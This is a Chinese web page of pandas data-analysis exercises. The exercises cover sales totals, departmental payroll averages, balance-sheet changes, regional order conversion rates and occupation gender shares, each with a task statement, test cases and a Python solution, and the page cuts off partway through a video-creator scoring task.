<p><a href="http://72.itmc.org.cn:80/JS001/data/user/15960/241/fj_lego_tmallshop_sales_data.xlsx">乐高天猫店销售数据</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">self, title</span>):</span><br><span class="line">        df = pd.read_excel(<span class="string">&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/241/fj_lego_tmallshop_sales_data.xlsx&quot;</span>)</span><br><span class="line">        df[<span class="string">&quot;price&quot;</span>] = df[<span class="string">&quot;price&quot;</span>].dropna()</span><br><span class="line">        df[<span class="string">&quot;sales_num&quot;</span>] = df[<span class="string">&quot;sales_num&quot;</span>].fillna(<span class="number">0</span>)</span><br><span class="line">        df[<span class="string">&quot;amount&quot;</span>] = df[<span class="string">&quot;price&quot;</span>] * df[<span class="string">&quot;sales_num&quot;</span>]</span><br><span class="line">        <span class="built_in">all</span> = df[<span class="string">&quot;amount&quot;</span>].<span class="built_in">sum</span>()</span><br><span class="line">        avg = df[<span class="string">&quot;price&quot;</span>].mean()</span><br><span class="line">        p = df[df[<span class="string">&quot;title&quot;</span>] == title][<span class="string">&quot;amount&quot;</span>].<span class="built_in">sum</span>()</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">round</span>(<span class="built_in">all</span>, <span class="number">2</span>), <span class="built_in">round</span>(avg, <span class="number">2</span>), <span class="built_in">round</span>(p, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
<h3 id="部门平均薪资汇总计算">部门平均薪资汇总计算</h3>
<h4 id="任务说明">任务说明</h4>
<p>读取给定的职工薪酬考勤簿，职工薪酬考勤簿由两个表格组成，分别是 基本薪资 工作表和 上班通勤 工作表。要求计算每一个部门内部的平均薪资，并把结果 降序 排列，返回给判定程序。<br>
员工个人薪酬计算过程如下：<br>
1.薪资由两部分组成， 月基本薪资 和 通勤工资，另外需要扣除需要缴纳的 社保费及公积金；<br>
2.月基本薪资 = 基本薪资 + 岗位工资 + 绩效工资；<br>
3.通勤工资中计算如下：<br>
日薪 = (基本薪资 + 岗位工资 + 绩效工资) / 应出勤天数<br>
时薪 = 日薪 / 8<br>
4.通勤工资中，法定节假日加班薪资是工作日加班的 2 倍，周末加班工资是工作日加班的 1.5 倍，工作日加班工资与时薪 相同；<br>
5.通勤工资需要扣除因请假导致的缺勤，请假/小时需要扣除的工资按照时薪计算。<br>
6.社保费及公积金个人缴费按照社会保险缴费基数计算：<br>
a.养老保险个人缴费比例是 8%<br>
b.医疗保险个人缴费比例是 2%<br>
c.失业保险个人缴费比例是 1%<br>
d.公积金缴费比例是 10%</p>
<p>示例：<br>
小王基本薪资 2000，岗位工资 2000，社会保险缴费基数是 2000。绩效工资 0，应出勤天数 20 天，请假 1 天，工作日加班 8 小时，法定节假日加班 4 小时，周末加班 4 小时。<br>
小王基本薪资+岗位工资+绩效工资是：2000 + 2000 = 4000；<br>
小王时薪：4000 / 20 / 8 = 25；<br>
小王加班工资：25 * 8 + 25 * 4 * 1.5 + 25 * 4 * 2 = 550；<br>
小王请假扣除：25 * 8 = 200；<br>
小王五险一金扣除：2000 * 0.08 + 2000 * 0.02 + 2000 * 0.01 + 2000 * 0.1 = 420；<br>
小王本月实发工资：4000 + 550 - 200 - 420 = 3930。<br>
假设小王所在部门有 5 个人，5 个人工资分别是 4050，4010，4120，4000，4500。小王所在部门的平均工资是：(3930+ 4010 + 4120 + 4000 + 4500) /5 = 4112。同理可算出其他部门的平均工资。</p>
<p>注意：返回结果需四舍五入保留小数点后两位！<br>
返回结果参数类型是 pd.Series。Series 的索引应为部门名，Series 的数据应为部门平均工资，Series 的 Name 属性应修改为 “平均薪资”。</p>
<h4 id="任务要求-4">任务要求</h4>
<p>1.程序无需接收参数输入，需要返回结果参数的格式是 pd.Series；<br>
2.返回结果时需要四舍五入保留小数点后两位，计算过程内保留小数点后两位可能导致最后结果不正确；<br>
3.部门平均工资需要降序排列；<br>
4.本题所需的基本薪资表和上班通勤表均在职工薪酬工作簿中，按需读取。<br>
5.Series 数据的类型应为 float 64，Name 属性应为 “平均薪资”。<br>
6.index 的属性名应为部门。</p>
<h4 id="测试用例-3">测试用例</h4>
<p>部分返回数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">部门  </span><br><span class="line">销售部       15767.86</span><br><span class="line">运营部       ****</span><br><span class="line">工程部       ****  </span><br><span class="line">财务部       ****  </span><br><span class="line">研发部       ****  </span><br><span class="line">市场部       ****  </span><br><span class="line">人力资源部    4233.27  </span><br><span class="line">Name: 平均薪资, dtype: float64</span><br></pre></td></tr></table></figure>
<h4 id="附件信息">附件信息</h4>
<p>职工薪酬簿.xlsx，职工薪酬工作簿由 基本薪资 工作表和 上班通勤 工作表组成。</p>
<p>1.基本薪资工作表。基本薪资工作表包含个人所属部门，各部分薪资状况和社会保险缴纳基数。共 7 个部门共 50 条数据，其中只有销售部有绩效工资。</p>
<p>2.上班通勤工作表。上班通勤工作表包含本月应出勤天数，实际出勤天数。请假加班天数等。工作表中的名字与基本薪资工作表中的名字一一对应。共 50 条数据。<br>
<a href="http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx">职工薪酬工作簿</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">department_salary_summary</span>(<span class="params">self</span>) -&gt; pd.Series:</span><br><span class="line">        basic_df = pd.read_excel(<span class="string">&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx&quot;</span>, sheet_name=<span class="string">&quot;基本薪资&quot;</span>)</span><br><span class="line">        commute_df = pd.read_excel(<span class="string">&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx&quot;</span>, sheet_name=<span class="string">&quot;上班通勤&quot;</span>)</span><br><span class="line">        basic_df[<span class="string">&quot;月基本薪资&quot;</span>] = basic_df[<span class="string">&quot;基本薪资&quot;</span>] + basic_df[<span class="string">&quot;岗位工资&quot;</span>] + basic_df[<span class="string">&quot;绩效工资&quot;</span>]</span><br><span class="line">        basic_df[<span class="string">&quot;日薪&quot;</span>] = (basic_df[<span class="string">&quot;月基本薪资&quot;</span>] /</span><br><span class="line">                            commute_df[<span class="string">&quot;应出勤天数（天）&quot;</span>])</span><br><span class="line">        basic_df[<span class="string">&quot;时薪&quot;</span>] = basic_df[<span class="string">&quot;日薪&quot;</span>] / <span class="number">8</span></span><br><span class="line">        commute_df[<span class="string">&quot;法定假日加班（小时）&quot;</span>] = commute_df[<span class="string">&quot;法定假日加班（小时）&quot;</span>].fillna(<span class="number">0</span>)</span><br><span class="line">        commute_df[<span class="string">&quot;周末加班（小时）&quot;</span>] = commute_df[<span class="string">&quot;周末加班（小时）&quot;</span>].fillna(<span class="number">0</span>)</span><br><span class="line">        commute_df[<span class="string">&quot;工作日加班（小时）&quot;</span>] = commute_df[<span class="string">&quot;工作日加班（小时）&quot;</span>].fillna(<span class="number">0</span>)</span><br><span class="line">        basic_df[<span class="string">&quot;加班工资&quot;</span>] = (basic_df[<span class="string">&quot;时薪&quot;</span>] * commute_df[<span class="string">&quot;法定假日加班（小时）&quot;</span>] * <span class="number">2</span> +</span><br><span class="line">                                basic_df[<span class="string">&quot;时薪&quot;</span>] * commute_df[<span class="string">&quot;周末加班（小时）&quot;</span>] * <span class="number">1.5</span></span><br><span class="line">                                + basic_df[<span class="string">&quot;时薪&quot;</span>] * commute_df[<span class="string">&quot;工作日加班（小时）&quot;</span>])</span><br><span class="line">        commute_df[<span class="string">&quot;请假（小时）&quot;</span>] = commute_df[<span class="string">&quot;请假（小时）&quot;</span>].fillna(<span class="number">0</span>)</span><br><span class="line">        basic_df[<span class="string">&quot;请假扣除&quot;</span>] = basic_df[<span class="string">&quot;时薪&quot;</span>] * commute_df[<span class="string">&quot;请假（小时）&quot;</span>]</span><br><span class="line">        basic_df[<span class="string">&quot;五险一金扣除&quot;</span>] = (basic_df[<span class="string">&quot;社会保险缴费基数&quot;</span>] * <span class="number">0.08</span> + basic_df[<span class="string">&quot;社会保险缴费基数&quot;</span>] * <span class="number">0.02</span> +</span><br><span class="line">                                    basic_df[<span class="string">&quot;社会保险缴费基数&quot;</span>] * <span class="number">0.01</span> + basic_df[<span class="string">&quot;社会保险缴费基数&quot;</span>] * <span class="number">0.1</span>)</span><br><span class="line">        basic_df[<span class="string">&quot;薪资&quot;</span>] = (basic_df[<span class="string">&quot;月基本薪资&quot;</span>] + basic_df[<span class="string">&quot;加班工资&quot;</span>] - basic_df[<span class="string">&quot;请假扣除&quot;</span>]</span><br><span class="line">                            - basic_df[<span class="string">&quot;五险一金扣除&quot;</span>])</span><br><span class="line">        df_1 = (basic_df.groupby(<span class="string">&quot;部门&quot;</span>)[<span class="string">&quot;薪资&quot;</span>]</span><br><span class="line">                .mean()</span><br><span class="line">                .<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">                .reset_index()</span><br><span class="line">                .sort_values(by=<span class="string">&quot;薪资&quot;</span>, ascending=<span class="literal">False</span>))</span><br><span class="line">        series = pd.Series(df_1[<span class="string">&#x27;薪资&#x27;</span>].values, index=df_1[<span class="string">&#x27;部门&#x27;</span>], name=<span class="string">&quot;平均薪资&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> series</span><br></pre></td></tr></table></figure>
<h3 id="编制比较资产负债表">编制比较资产负债表</h3>
<h4 id="任务描述">任务描述</h4>
<p>“A企业资产负债表.xlsx”文件的“比较资产负债表”包含 A 企业 2020 年和 2021 年的资产负债数据，请完成以下指定任务。<br>
1.使用 0 填充表格中的空值；<br>
2.计算 2021 年各项目变动额和变动率并添加相关数据列；<br>
3.程序接受某项目的项目名称 name，要求输出该项目对应的变动额和变动率。</p>
<h4 id="任务要求-5">任务要求</h4>
<p>1.代码要编辑在 balance_sheet 函数下；<br>
2.变动额需要四舍五入保留小数点后 2 位，变动率需要四舍五入保留小数点后 4 位；<br>
3.变动额和变动率的数据类型都是浮点数数据类型；<br>
4.程序只判定 return后的结果值，输出（print）后的结果值不作为判断依据；<br>
5.程序返回结果的数据类型为列表。</p>
<h4 id="测试用例-4">测试用例</h4>
<p>输入：name=“负债总计”<br>
输出：[26928392.51, 0.2567]<br>
解释：负债总计变动额是 26928392.51，变动率是 0.2567</p>
<p>输入：name=“无形资产”<br>
输出：[-600000.0, -0.0667]<br>
解释：无形资产变动额是 -600000.0，变动率是 -0.0667</p>
<p>输入：name=“负债合计”<br>
输出：[26928392.51, 0.2567]</p>
<h4 id="代码提示">代码提示</h4>
<p>我们通过将 Series 转换为列表的形式，将其中的数字提取出来。</p>
<p>通过如下案例，我们取出 DataFrame 中的 1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In [1]: import pandas as pd</span><br><span class="line"></span><br><span class="line"># 定义一个 DataFrame</span><br><span class="line">In [2]: df = pd.DataFrame([[1, 2], [3, 4]], columns=[&#x27;A&#x27;, &#x27;B&#x27;])</span><br><span class="line"></span><br><span class="line"># 预览下 df</span><br><span class="line">In [3]: df</span><br><span class="line">Out[3]:</span><br><span class="line">   A  B</span><br><span class="line">0  1  2</span><br><span class="line">1  3  4</span><br><span class="line"></span><br><span class="line"># 通过列名取出 A 列</span><br><span class="line">In [4]: df[&#x27;A&#x27;]</span><br><span class="line">Out[4]:</span><br><span class="line">0    1</span><br><span class="line">1    3</span><br><span class="line">Name: A, dtype: int64</span><br><span class="line"></span><br><span class="line"># 取出 A 列再将 A 列转换为列表</span><br><span class="line">In [5]: df[&#x27;A&#x27;].tolist()</span><br><span class="line">Out[5]: [1, 3]</span><br><span class="line"></span><br><span class="line"># 取出列表中的第一个元素，就是我们想要的 1</span><br><span class="line">In [6]: df[&#x27;A&#x27;].tolist()[0]</span><br><span class="line">Out[6]: 1</span><br></pre></td></tr></table></figure>
<p><a href="http://72.itmc.org.cn:80/JS001/data/user/15960/243/fj_Interprice_balance_data.xlsx">A企业资产负债表</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">balance_sheet</span>(<span class="params">self, name</span>):</span><br><span class="line">        compare = pd.read_excel(<span class="string">&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/243/fj_Interprice_balance_data.xlsx&quot;</span>, sheet_name=<span class="string">&quot;比较资产负债表&quot;</span>)</span><br><span class="line">        compare = compare.fillna(<span class="number">0</span>)</span><br><span class="line">        compare[<span class="string">&quot;price&quot;</span>] = compare[<span class="string">&quot;2021.12.31&quot;</span>] - compare[<span class="string">&quot;2020.12.31&quot;</span>]</span><br><span class="line">        compare[<span class="string">&quot;lv&quot;</span>] = compare[<span class="string">&quot;price&quot;</span>] / compare[<span class="string">&quot;2020.12.31&quot;</span>]</span><br><span class="line">        data = compare[compare[<span class="string">&quot;项目&quot;</span>] == name]</span><br><span class="line">        <span class="keyword">return</span> [data[<span class="string">&quot;price&quot;</span>].values.<span class="built_in">round</span>(<span class="number">2</span>)[<span class="number">0</span>], data[<span class="string">&quot;lv&quot;</span>].values.<span class="built_in">round</span>(<span class="number">4</span>)[<span class="number">0</span>]]</span><br></pre></td></tr></table></figure>
<h3 id="某店铺不同地区销售情况分析">某店铺不同地区销售情况分析</h3>
<h4 id="题目描述-2">题目描述</h4>
<p>下方是某店铺在 2 月份的订单数据，共 28010 行、7 列。 在该数据中，每一行代表一笔订单，每一笔订单可以 看做是一位顾客（买家），价格相同的产品可视为同一产品；</p>
<p>请编写程序，完成以下任务：<br>
程序传入参数 area（收货地址），要求计算该地区订单的’订单的付款转化率’、’买家全额支付的转化率’、’买家实际支付总金额’、’客单价’、’销量（订单量）最多的产品的价格’、’买家实际支付总金额在所有地区实际支付总金额中的占比’，并将结果以列表形式返回。</p>
<h4 id="题目要求-2">题目要求</h4>
<p>1.程序接收 str 类型的 area，返回的结果为 list 数据类型；</p>
<p>2.返回的结果中，列表中各个数据的数据类型为 str，其中转化率数据及占比数据需以百分比的形式输出，并且需要保留小数点后2位，如’13.14%’，其余结果不需要以百分比形式输出，但需要保留小数点后2位；</p>
<p>3.如果某地区所有买家的买家实际支付金额为 0，即该地区没有付费行为。则该地区的’客单价’、’销量（订单量）最多的产品的价格’需返回字符串’本地区无销量’，其他结果则正常计算；</p>
<p>4.如果该产品（订单）被全额退款，那么该产品不计入销量。</p>
<h4 id="参考公式">参考公式</h4>
<p>1.付款转化率 = 付款订单数 / 总订单数；</p>
<p>2.买家全额支付的转化率 = 买家全额支付的订单数 / 总订单数；</p>
<p>3.客单价 = 实际支付金额 / 支付买家数；</p>
<h4 id="测试用例-5">测试用例</h4>
<p>输入：area = ‘河南省’<br>
输出：[‘81.99%’, ‘61.18%’, ‘56354.03’, ‘92.84’, ‘37.00’, ‘2.96%’]<br>
解释：河南省’订单的付款转化率’为’81.99%’，’买家全额支付的转化率’为’61.18%’，’买家实际支付总金额’为’56354.03’，’客单价’为’92.84’，’销量（订单量）最多的产品的价格’为’37.00’，’买家实际支付总金额在所有地区实际支付总金额中的占比’为’2.96%’</p>
<p>输入：area = ‘江苏省’<br>
输出：[‘86.78%’, ‘66.75%’, ‘159359.18’, ‘109.22’, ‘37.00’, ‘8.38%’]</p>
<p><a href="http://72.itmc.org.cn:80/JS001/data/user/15960/240/fj_7568_tmall_order_report.csv">二月销售数据</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">self, area: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        source = pd.read_csv(<span class="string">&quot;data/二月销售数据-1.csv&quot;</span>)</span><br><span class="line">        <span class="comment"># 订单的付款转化率</span></span><br><span class="line">        <span class="comment"># 付款订单数</span></span><br><span class="line">        fkdds = source[(source[<span class="string">&quot;收货地址&quot;</span>] == area) &amp; (source[<span class="string">&quot;订单付款时间&quot;</span>].notna())].shape[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 总订单数</span></span><br><span class="line">        zdds = source[(source[<span class="string">&quot;收货地址&quot;</span>] == area)].shape[<span class="number">0</span>]</span><br><span class="line">        fkzhl = fkdds / zdds * <span class="number">100</span></span><br><span class="line">        <span class="comment"># 买家全额支付的转化率</span></span><br><span class="line">        <span class="comment"># 买家全额支付的订单数</span></span><br><span class="line">        qedds = source[(source[<span class="string">&quot;收货地址&quot;</span>] == area) &amp; (source[<span class="string">&quot;总金额&quot;</span>] == source[<span class="string">&quot;买家实际支付金额&quot;</span>])].shape[<span class="number">0</span>]</span><br><span class="line">        qezhl = qedds / zdds * <span class="number">100</span></span><br><span class="line">        <span class="comment"># 买家实际支付总金额</span></span><br><span class="line">        sjzfzje = source[(source[<span class="string">&quot;收货地址&quot;</span>] == area)][<span class="string">&quot;买家实际支付金额&quot;</span>].<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sjzfzje == <span class="number">0</span>:</span><br><span class="line">            kdj = <span class="string">&quot;本地区无销量&quot;</span></span><br><span class="line">            zdcpjg = <span class="string">&quot;本地区无销量&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 客单价</span></span><br><span class="line">            <span class="comment"># 支付买家数</span></span><br><span class="line">            zfmjs = source[(source[<span class="string">&quot;收货地址&quot;</span>] == area) &amp; (source[<span class="string">&quot;买家实际支付金额&quot;</span>] != <span class="number">0</span>)].shape[<span class="number">0</span>]</span><br><span class="line">            kdj = sjzfzje / zfmjs</span><br><span class="line">            <span class="comment"># 销量（订单量）最多的产品的价格</span></span><br><span class="line">            zdcpjg = source[(source[<span class="string">&quot;收货地址&quot;</span>] == area)][<span class="string">&quot;总金额&quot;</span>].mode().iloc[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 买家实际支付总金额在所有地区实际支付总金额中的占比</span></span><br><span class="line">        sydqzjezb = sjzfzje / source[<span class="string">&quot;买家实际支付金额&quot;</span>].<span class="built_in">sum</span>() * <span class="number">100</span></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">                <span class="built_in">str</span>(<span class="built_in">round</span>(fkzhl,<span class="number">2</span>)) + <span class="string">&quot;%&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">round</span>(fkzhl,<span class="number">2</span>)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) == <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">round</span>(fkzhl,<span class="number">2</span>)) + <span class="string">&quot;0%&quot;</span>,</span><br><span class="line">                <span class="built_in">str</span>(<span class="built_in">round</span>(qezhl,<span class="number">2</span>)) + <span class="string">&quot;%&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">round</span>(qezhl,<span class="number">2</span>)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) == <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">round</span>(qezhl,<span class="number">2</span>)) + <span class="string">&quot;0%&quot;</span>,</span><br><span class="line">                <span class="built_in">str</span>(<span class="built_in">round</span>(sjzfzje,<span class="number">2</span>)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">round</span>(sjzfzje,<span class="number">2</span>)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) == <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">round</span>(sjzfzje,<span class="number">2</span>)) + <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="built_in">str</span>(<span class="built_in">round</span>(kdj,<span class="number">2</span>)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">round</span>(kdj,<span class="number">2</span>)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) == <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">round</span>(kdj,<span class="number">2</span>)) + <span class="string">&quot;0&quot;</span>,                </span><br><span class="line">                <span class="built_in">str</span>(<span class="built_in">round</span>(zdcpjg,<span class="number">2</span>)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">round</span>(zdcpjg,<span class="number">2</span>)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) == <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">round</span>(zdcpjg,<span class="number">2</span>)) + <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="built_in">str</span>(<span class="built_in">round</span>(sydqzjezb,<span class="number">2</span>)) + <span class="string">&quot;%&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">round</span>(sydqzjezb,<span class="number">2</span>)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) == <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">str</span>(<span class="built_in">round</span>(sydqzjezb,<span class="number">2</span>)) + <span class="string">&quot;0%&quot;</span>      </span><br><span class="line">            ]</span><br></pre></td></tr></table></figure>
<h3 id="用户职位信息统计">用户职位信息统计</h3>
<h4 id="任务详情-4">任务详情</h4>
<p>请根据任务下方提供的用户职位统计信息表，完成以下任务：<br>
职位表中每个字段含义如下：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>user_id</td>
<td>用户序号</td>
</tr>
<tr>
<td>age</td>
<td>用户年龄</td>
</tr>
<tr>
<td>gender</td>
<td>用户性别</td>
</tr>
<tr>
<td>occupation</td>
<td>用户职位</td>
</tr>
<tr>
<td>zip_code</td>
<td>用户邮编</td>
</tr>
<tr>
<td>编写一个职位统计函数 jobStatistics()，给定表格里的任一职位，统计其以下信息</td>
<td></td>
</tr>
</tbody>
</table>
<ol>
<li>任务一：统计该职位女性用户的百分占比（结果保留两位小数），输出数据类型为 str；</li>
<li>任务二：统计该职位女性用户百分占比在所有职位女性用户百分占比中的排名（降序），输出数据类型为 int。<br>
将以上2个结果保存在 数组(list) 中，按顺序返回。</li>
</ol>
<h4 id="任务要求-6">任务要求</h4>
<ol>
<li>程序接收一个 str 类型的变量 op，返回一个 list 类型的变量；</li>
<li>“gender” 列中，“F” 代表女性，“M” 代表男性；</li>
<li>返回结果格式如下：[任务一: str, 任务二: int]。</li>
</ol>
<h4 id="测试用例-6">测试用例</h4>
<p>输入：‘artist’<br>
输出：[ ‘46.43%’, 4]<br>
解释：该职位中女性用户占据该职位所有用户的46.43%，该职位女性占比排名在所有职位女性占比排名中位列第 4</p>
<p>输入：‘student’<br>
输出：[‘30.61%’, 10]<br>
解释：该职位中女性用户占据该职位所有用户的30.61%，该职位女性占比排名在所有职位女性占比排名中位列第 10</p>
<p><a href="http://72.itmc.org.cn:80/JS001/data/user/15960/67/fj_jobstatics.xlsx">用户职位信息统计表.xlsx</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">jobStatistics</span>(<span class="params">self, occupation: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        url = <span class="string">&#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/67/fj_jobstatics.xlsx&#x27;</span></span><br><span class="line">        data = pd.read_excel(url)</span><br><span class="line">        r1 = <span class="built_in">str</span>(<span class="built_in">round</span>(<span class="built_in">len</span>(data[(data[<span class="string">&#x27;gender&#x27;</span>] == <span class="string">&#x27;F&#x27;</span>) &amp; (data[<span class="string">&#x27;occupation&#x27;</span>] == occupation)]) / <span class="built_in">len</span>(</span><br><span class="line">            data[(data[<span class="string">&#x27;occupation&#x27;</span>] == occupation)]) * <span class="number">100</span>, <span class="number">2</span>)) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">        qbnx = data.groupby(<span class="string">&#x27;occupation&#x27;</span>)[<span class="string">&#x27;user_id&#x27;</span>].size()</span><br><span class="line">        <span class="comment"># 每个部门的女性</span></span><br><span class="line">        bmnx = data[data[<span class="string">&#x27;gender&#x27;</span>] == <span class="string">&#x27;F&#x27;</span>].groupby(<span class="string">&#x27;occupation&#x27;</span>)[<span class="string">&#x27;user_id&#x27;</span>].size()</span><br><span class="line">        bl = <span class="built_in">round</span>((bmnx / qbnx) * <span class="number">100</span>, <span class="number">2</span>)</span><br><span class="line">        px = bl.sort_values(ascending=<span class="literal">False</span>)</span><br><span class="line">        pm = <span class="built_in">int</span>(px.index.get_loc(occupation)) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r1.split(<span class="string">&#x27;%&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]) &lt; <span class="number">2</span>:</span><br><span class="line">            r1 = r1.split(<span class="string">&quot;%&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;0%&quot;</span></span><br><span class="line">        <span class="keyword">return</span> [r1, pm]</span><br></pre></td></tr></table></figure>
<h3 id="某知名网站高质量视频主挖掘">某知名网站高质量视频主挖掘</h3>
<h4 id="任务详情-5">任务详情</h4>
<p>根据下方提供的某知名网站视频信息数据，构造一个打分模型，并根据分值挖掘高质量视频主，要求输入视频主的名字author，返回对应的UP主分层。</p>
<p>IFL模型<br>
针对视频主的视频信息构建了IFL模型，以评估视频的质量。</p>
<p>I (Interaction_rate)<br>
I 值反映的是平均每个视频的互动率，互动率越高，表明其视频更能产生用户的共鸣，使其有话题感。<br>
I = (总弹幕数 + 总评论数) / (总播放量 * 统计范围内视频数量) * 100。</p>
<p>F (Frequence)<br>
F 值表示的是每个视频的平均发布周期，每个视频之间的发布周期越短，说明内容生产者创作视频的时间也就越短，创作时间太长，不是忠实粉丝的用户可能将其遗忘。<br>
F = (统计范围内最晚发布视频时间 - 最早发布视频时间) / 发布视频的数量。<br>
如果 F 的值为 0，表示该视频主仅发布一条视频。那么将 F 的值重新赋值为 F 的最大值 + 1，如原有数据中，F 的最大值是 100，那么就将 F 的最大值设置为 100 + 1 = 101。</p>
<p>L (Like_rate)<br>
L值表示的是统计时间内发布视频的平均点赞率，越大表示视频质量越稳定，用户对up主的认可度也就越高。<br>
L = (点赞数 * 1 + 投币数 * 2 + 收藏数 * 3 + 分享数 * 4) / (播放量 * 发布视频数) * 100。</p>
<p>维度打分<br>
维度确认的核心是分值确定，按照设定的标准，我们给每个视频主的 I/F/L 值打分，分值的大小取决于我们的偏好，<br>
即我们越喜欢的行为，打的分数就越高 ：<br>
- I 值。表示 up 主视频的平均评论率，这个值越大，就说明其视频越能使用户有话题，当I值越大时，分值越大。<br>
- F 值。表示视频的平均发布周期，我们当然想要经常看到，所以这个值越大时，分值越小。<br>
- L 值。表示发布视频的平均点赞率，S 值越大时，质量越稳定，分值也就越大。</p>
<p>视频主主分层 我们根据每一项指标是否高于平均值，把UP主划分为8类，我们根据案例中的情况进行划分，具体如下表</p>
<table>
<thead>
<tr>
<th>视频主分类</th>
<th>I值是否大于平均值</th>
<th>F值是否小于平均值</th>
<th>L值是否大于平均值</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>高质量视频主</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>用户活跃高，更新周期短，视频质量高</td>
</tr>
<tr>
<td>高质量拖更视频主</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>用户活跃高，更新周期长，视频质量高</td>
</tr>
<tr>
<td>高质量内容高深视频主</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>用户活跃低，更新周期短，视频质量高</td>
</tr>
<tr>
<td>高质量内容高深拖更视频主</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>用户活跃低，更新周期长，视频质量高</td>
</tr>
<tr>
<td>接地气活跃视频主</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>用户活跃高，更新周期短，视频质量低</td>
</tr>
<tr>
<td>活跃视频主</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>用户活跃低，更新周期短，视频质量低</td>
</tr>
<tr>
<td>接地气视频主</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>用户活跃高，更新周期长，视频质量低</td>
</tr>
<tr>
<td>还在成长的视频主</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>用户活跃低，更新周期长，视频质量低</td>
</tr>
</tbody>
</table>
<p>数据链接已经在下方给出： 各字段表示含义如下：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>pubdate</td>
<td>发布时间</td>
</tr>
<tr>
<td>bv</td>
<td>BV号</td>
</tr>
<tr>
<td>url</td>
<td>视频链接</td>
</tr>
<tr>
<td>title</td>
<td>标题</td>
</tr>
<tr>
<td>author</td>
